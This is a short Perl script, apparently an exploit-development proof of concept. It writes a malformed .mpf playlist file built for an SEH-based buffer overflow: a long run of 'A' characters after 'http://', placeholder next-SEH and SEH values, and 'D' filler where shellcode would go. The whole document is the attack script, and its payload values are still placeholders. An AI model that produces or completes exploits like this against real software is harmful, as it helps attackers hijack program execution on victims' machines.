#!/usr/bin/perl

my $totalsize=5005;
my $sploitfile="c0d3r.mpf";
my $junk = "http://";
$junk=$junk."A" x 4105;
my $nseh="BBBB";
my $seh="CCCC";
my $shellcode="D"x($totalsize-length($junk.$nseh.$seh));
my $payload=$junk.$nseh.$seh.$shellcode;
print " [+] Writing exploit file $sploitfile\n";
open (myfile,">$sploitfile");
print myfile $payload;close (myfile);
print " [+] File written\n";
print " [+] " . length($payload)." bytes\n";
